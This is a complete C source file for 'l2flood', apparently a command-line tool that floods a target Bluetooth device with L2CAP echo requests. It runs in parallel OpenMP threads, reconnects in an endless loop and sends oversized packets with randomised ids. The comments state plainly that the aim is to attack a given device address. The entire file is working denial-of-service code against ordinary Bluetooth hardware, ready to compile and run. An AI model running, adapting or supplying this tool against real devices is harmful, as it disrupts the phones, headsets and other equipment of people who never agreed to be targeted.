/* SPDX-License-Identifier: GPL-3.0-or-later
 * Copyright (c) 2026 Ivan Kovmir */

/* Includes */
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>

/* Constants and Macros */
#ifdef _OPENMP
#include <omp.h>
#else
#error "OpenMP support missing."
#endif /* _OPENMP */

#ifndef __linux__
#warning "Unsupported operating system."
#endif /* __linux__ */

#define SUPPORT_URL "https://github.com/kovmir/l2flood/issues"
#ifndef GIT_VERSION
#define GIT_VERSION "dev"
#endif /* GIT_VERSION */
#define SEND_BUF_SIZE 600
#define BURST_LEN 50
#define THREAD_SYNC_DELAY_US 5000

/* Close socket. */
#define CLOSE_SOCKET(socket_fd) do { \
	if ((socket_fd) != -1) { \
		close(socket_fd); \
		socket_fd = -1; \
	} \
} while (0)

/* Sleep the US microseconds; usleep(3) is deprecated. */
#define SLEEP_US(US) do { \
	nanosleep(&(struct timespec){ \
		.tv_sec = 0, \
		.tv_nsec = (US) * 1000 \
	}, NULL); \
} while(0)

/* Function prototypes */
/* Flood attack target_baddr. */
static void flood_ping(const char *target_baddr);
/* Print usage manual. */
static inline void usage(void);

/* Global variables */
static bdaddr_t local_baddr; /* Local Bluetooth interface to attack from. */
static int num_threads;      /* Number of parallel workers. */

void
flood_ping(const char *target_baddr)
{
	struct sockaddr_l2 addr;
	socklen_t optlen;
	int i, socket_fd;
	char send_buf[L2CAP_CMD_HDR_SIZE + SEND_BUF_SIZE];
	char host_btaddr[18];
	int fd_opts;

	/* See random_r(3); that's for random number generator. */
	char statebuf[8] = {0};
	struct random_data rand_state = {0};
	unsigned int seed = (unsigned int)time(NULL);
	int32_t randomID;

	/* Socket options. */
	struct linger linger_opt = {1, 0};
	struct timeval snd_tv = {0, 300000}; /* 300ms */
	int reuse = 1;
	int sock_err;
	socklen_t sock_err_len;

	/* Initialize random number generator. */
	if (initstate_r(seed, statebuf, sizeof(statebuf), &rand_state) == -1) {
		err(1, "unable to seed random number generator (initstate_r)");
	}
	/* Initialize send buffer */
	for (i = 0; i < SEND_BUF_SIZE; i++)
		send_buf[L2CAP_CMD_HDR_SIZE + i] = (i % 40) + 'A';

	for (;;) {
		/* Create a non-blocking socket
		 * so we can control connection attempt timeout; see below. */
		socket_fd = socket(PF_BLUETOOTH, SOCK_RAW|SOCK_NONBLOCK, BTPROTO_L2CAP);
		if (socket_fd == -1)
			errx(1, "Can't create socket");
		/* close() calls send RST immediately instead of graceful detach. */
		if (setsockopt(socket_fd, SOL_SOCKET,
				SO_LINGER, &linger_opt, sizeof(linger_opt)) == -1)
			errx(1, "Can't set socket options");
		/* Don't care if Bluetooth is still processing requests. */
		if (setsockopt(socket_fd, SOL_SOCKET,
				SO_REUSEADDR, &reuse, sizeof(reuse)) == -1)
			errx(1, "Can't set socket options");

		/* Bind to a local address. */
		memset(&addr, 0, sizeof(addr));
		addr.l2_family = AF_BLUETOOTH;
		bacpy(&addr.l2_bdaddr, &local_baddr);
		if (bind(socket_fd, (struct sockaddr *) &addr, sizeof(addr)) == -1)
			errx(1, "Can't bind socket");

		/* Connect to the remote device. */
		memset(&addr, 0, sizeof(addr));
		addr.l2_family = AF_BLUETOOTH;
		str2ba(target_baddr, &addr.l2_bdaddr);
		errno = 0;
		if (connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
			goto connection_failed;
		if (errno != EINPROGRESS)
			goto connection_failed;

		/* Await connection for 1.5 seconds... */
		struct pollfd cpf = {socket_fd, POLLOUT, 0};
		if (poll(&cpf, 1, 1500) < 1)
			goto connection_failed;
		/* Check for errors. */
		sock_err = 0;
		sock_err_len = sizeof(sock_err);
		if (getsockopt(socket_fd, SOL_SOCKET, SO_ERROR, &sock_err, &sock_err_len) == -1)
			goto connection_failed;
		if (sock_err != 0)
			goto connection_failed;

		/* Connected; switch back to blocking sends. */
		fd_opts = fcntl(socket_fd, F_GETFL, 0);
		if (fd_opts == -1)
			errx(1, "Can't request socket properties.");
		fcntl(socket_fd, F_SETFL, fd_opts & ~O_NONBLOCK);

		/* Set timeout on send() calls. */
		setsockopt(socket_fd, SOL_SOCKET, SO_SNDTIMEO, &snd_tv, sizeof(snd_tv));

		/* Write logs. */
		memset(&addr, 0, sizeof(addr));
		optlen = sizeof(addr);
		if (getsockname(socket_fd, (struct sockaddr *) &addr, &optlen) < 0)
			errx(1, "Can't get local address");
		ba2str(&addr.l2_bdaddr, host_btaddr);
		printf("Thread %2d attacks %s from %s (data size %d) ...\n",
		       omp_get_thread_num(), target_baddr, host_btaddr, SEND_BUF_SIZE);

		/* Send garbage. */
		for (i = 0; i < BURST_LEN; i++) {
			if (random_r(&rand_state, &randomID) == -1)
				err(1, "Can't random_r()");

			l2cap_cmd_hdr *send_cmd = (l2cap_cmd_hdr *) send_buf;
			send_cmd->ident = (uint8_t)randomID;
			send_cmd->len   = htobs(SEND_BUF_SIZE);
			send_cmd->code  = L2CAP_ECHO_REQ;

			if (send(socket_fd, send_buf, L2CAP_CMD_HDR_SIZE + SEND_BUF_SIZE, 0) == -1)
				break; /* Whatever. Reconnect... */
		}

connection_failed:
		CLOSE_SOCKET(socket_fd);
		/* Sync threads so they attack ~simultaneously
		 * and prevent CPU burn. */
		SLEEP_US(THREAD_SYNC_DELAY_US);
	}
}

inline void
usage(void)
{
	printf("Usage:\n\tl2flood [-i bluetooth_card] "
	                         "[-t thread_count] "
	                         "[-v] "
	                         "[-h] "
	                         "<target_bluetooth_address>\n");
}

int
main(int argc, char *argv[])
{
	int opt;

	/* Bind to any local Bluetooth interface by default. */
	bacpy(&local_baddr, BDADDR_ANY);
	/* A high number of workers is usually pointless,
	 * as is having more workers than CPUs. */
	num_threads = sysconf(_SC_NPROCESSORS_ONLN);
	if (num_threads > 4)
		num_threads = 4;

	while ((opt = getopt(argc,argv,"i:t:vh")) != EOF) {
		switch(opt) {
		/* Bluetooth interface. */
		case 'i':
			if (!strncasecmp(optarg, "hci", 3))
				hci_devba(atoi(optarg + 3), &local_baddr);
			else
				str2ba(optarg, &local_baddr);
			break;
		/* Number of parallel workers. */
		case 't':
			num_threads = atoi(optarg);
			if (num_threads < 1)
				err(1, "invalid number of threads");
			break;
		case 'v':
			printf("%s\n", GIT_VERSION);
			printf("Support: %s\n", SUPPORT_URL);
			return 0;
		case 'h':
			usage();
			return 0;
		default:
			usage();
			return -1;
		}
	}
	argc -= optind;
	argv += optind;

	if (argc == 0) {
		usage(); /* No target given. */
		return -1;
	}

	assert(num_threads > 0);
#pragma omp parallel num_threads(num_threads)
	{
		flood_ping(argv[0]);
	}

	return 0;
}
